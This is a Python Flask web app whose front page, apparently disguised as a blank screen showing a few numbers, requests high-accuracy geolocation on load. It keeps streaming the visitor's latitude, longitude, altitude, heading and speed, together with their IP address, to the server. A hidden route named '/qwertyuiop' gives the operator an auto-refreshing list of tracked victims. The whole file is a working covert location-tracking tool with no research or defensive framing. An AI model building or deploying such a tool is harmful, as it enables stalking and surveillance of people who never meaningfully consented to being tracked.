import os
from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)
port = int(os.environ.get('PORT', 5000))
visitors = []

MAIN_HTML = """<!DOCTYPE html>
<html>
<head><title>main</title><style>
body{background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font:8vw monospace}
</style></head>
<body><div id="c">-44 34 44</div>
<script>
function sendAll() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(p => {
        let data = {
            lat: p.coords.latitude.toFixed(8),
            lon: p.coords.longitude.toFixed(8),
            acc: p.coords.accuracy.toFixed(2),
            alt: p.coords.altitude ? p.coords.altitude.toFixed(2) : '0',
            altAcc: p.coords.altitudeAccuracy ? p.coords.altitudeAccuracy.toFixed(2) : '0',
            heading: p.coords.heading ? p.coords.heading.toFixed(2) : '0',
            speed: p.coords.speed ? p.coords.speed.toFixed(2) : '0',
            time: new Date(p.timestamp).toISOString()
        };
        document.getElementById('c').innerText = data.lat + ' ' + data.lon + ' ' + data.alt;
        fetch('/track', {
            method:'POST',
            body:JSON.stringify(data),
            headers:{'Content-Type':'application/json'}
        });
        setTimeout(getMore, 100);
    }, e => {}, {enableHighAccuracy:true, timeout:15000, maximumAge:0});
}
function getMore() {
    navigator.geolocation.watchPosition(p => {
        let data = {
            lat: p.coords.latitude.toFixed(8),
            lon: p.coords.longitude.toFixed(8),
            acc: p.coords.accuracy.toFixed(2),
            alt: p.coords.altitude ? p.coords.altitude.toFixed(2) : '0',
            heading: p.coords.heading ? p.coords.heading.toFixed(2) : '0',
            speed: p.coords.speed ? p.coords.speed.toFixed(2) : '0'
        };
        fetch('/track', {
            method:'POST',
            body:JSON.stringify(data),
            headers:{'Content-Type':'application/json'}
        });
    }, e => {}, {enableHighAccuracy:true, timeout:15000, maximumAge:0});
}
if (navigator.permissions) {
    navigator.permissions.query({name:'geolocation'}).then(r => {
        if (r.state == 'granted') sendAll();
        else if (r.state == 'prompt') sendAll();
    });
} else { sendAll(); }
</script></body>"""

TRACKER_HTML = """<!DOCTYPE html>
<html>
<head><title>tracker</title><style>
body{background:#000;color:#0f0;margin:20px;font:14px monospace;white-space:pre}
</style></head>
<body>{}<script>setTimeout(()=>location.reload(),2000)</script></body>"""

@app.route('/')
def main():
    return render_template_string(MAIN_HTML)

@app.route('/qwertyuiop')
def tracker():
    output = f'=== ВСЕГО ЗАПИСЕЙ: {len(visitors)} ===\n\n'
    for i, v in enumerate(visitors[-200:], 1):
        output += f'{i}. {v["lat"]} {v["lon"]} | {v["acc"]}м | {v["ip"]}\n'
    return render_template_string(TRACKER_HTML.replace('{}', output))

@app.route('/track', methods=['POST'])
def track():
    d = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip: ip = ip.split(',')[0].strip()
    if d and 'lat' in d and 'lon' in d:
        entry = {
            'lat': d['lat'],
            'lon': d['lon'],
            'acc': d.get('acc', '?'),
            'alt': d.get('alt', '0'),
            'heading': d.get('heading', '0'),
            'speed': d.get('speed', '0'),
            'ip': ip,
            'time': datetime.now().strftime('%H:%M:%S')
        }
        visitors.append(entry)
        print(f'\n[GPS] {d["lat"]} {d["lon"]}')
        print(f'   Точность: {d.get("acc", "?")}м | Высота: {d.get("alt", "0")}м')
        print(f'   Направление: {d.get("heading", "0")}° | Скорость: {d.get("speed", "0")} м/с')
        print(f'   IP: {ip} | {entry["time"]}\n')
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=port)
